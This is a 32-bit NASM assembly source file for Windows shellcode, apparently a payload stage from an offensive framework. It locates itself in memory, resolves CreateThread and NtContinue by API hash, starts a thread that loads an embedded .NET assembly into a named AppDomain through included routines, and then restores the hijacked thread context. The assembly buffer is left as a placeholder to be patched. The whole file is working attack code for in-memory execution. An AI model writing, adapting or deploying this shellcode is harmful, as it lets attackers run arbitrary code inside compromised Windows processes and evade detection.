BITS 32

%define APPDOMAIN_VALUE "aXbpOzzF"

KERNEL32_CREATETHREAD_HASH      equ 0x000cf314

NTDLL_HASH 					     	  equ 0x0001b708
NTDLL_NTCONTINUE_HASH 				  equ 0x0003711e

segment .text
	call geteip
geteip:
	pop ebx

	; check if WOW64Reserved is null
	mov eax, [fs:0xc0]
	cmp eax, 0
	jne dummy

	; set EDI for return context under x86
	mov edi, esp
	add edi, 0xc
	mov edi, [edi]

dummy:
	; setup dummy stack if necessary
	mov eax, [fs:0x18]
	cmp dword [eax+0x1a8], 0
	jne continue
	lea esi, [CONTEXT-geteip+ebx]
	mov dword [eax+0x1a8], esi

continue:
	push KERNEL32_CREATETHREAD_HASH
	push KERNEL32_HASH
	call GetFunctionAddress
	mov esi, ebx
	add esi, execunet
	sub esi, 5
	xor ecx, ecx
	push ecx
	push ecx
	push ebx
	push esi
	push ecx
	push ecx
	call eax

	; restore PCONTEXT and NtContinue outta here
	push NTDLL_NTCONTINUE_HASH
	push NTDLL_HASH
	call GetFunctionAddress
	push 1
	push edi
	call eax

	; shouldn't get here!

	ret

%include "sc-32-api-functions.asm"
%include "sc-32-execunet.asm"

APPDOMAINNAME:
	db __utf16__(APPDOMAIN_VALUE), 0, 0

CONTEXT:
	TIMES 0x18 db 0

ASSEMBLY_LENGTH 	equ 1094795585
ASSEMBLY:
db 0x00